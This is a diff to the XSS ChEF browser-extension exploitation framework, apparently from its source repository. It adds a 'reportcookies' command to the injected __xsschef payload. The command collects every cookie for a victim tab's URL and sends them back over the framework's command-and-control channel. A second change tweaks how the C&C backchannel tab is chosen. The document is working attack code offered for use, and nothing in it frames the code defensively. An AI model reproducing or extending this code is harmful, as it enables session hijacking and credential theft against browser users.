@@ -201,6 +201,23 @@ function __xsschef() {
                 case 'reporthtml':
                         postToSheep(msg.id, {cmd: 'sendhtml'});
                 break;
+                case 'reportcookies':
+                    chrome.tabs.get(msg.id, function(t) {
+                        var cookstr = "No cookies permissions in extension";
+                        chrome.cookies.getAll({
+                            url: t.url
+                        }, function(cookies) {
+                            cookstr = "";
+                            cookies.forEach(function(cookie) {
+                                cookstr += encodeURIComponent(cookie.name) + '; ' + encodeURIComponent(cookie.value); 
+                            });
+                        });
+
+                        setTimeout(function() {
+                            log({type:"recvstuff",  id: t.id, url: t.url , result: {'allcookies':cookstr}});
+                        }, 300);
+                    });
+                break;
                 case 'createtab':
                     chrome.tabs.create({url: msg.p, active: false});
                 break;
@@ -239,7 +256,7 @@ function __xsschef() {
         } else {
             // proxy the requests to C&C through backchannel tab
             // setup backchannel port in first http/https tab
-            chrome.tabs.query({url: '<all_urls>'}, function(tabs) {
+            chrome.tabs.query({url: '<all_urls>', status: 'complete'}, function(tabs) {
                 var t;
                 for (var i=0; i<tabs.length; i++) {
                     t = tabs[i];
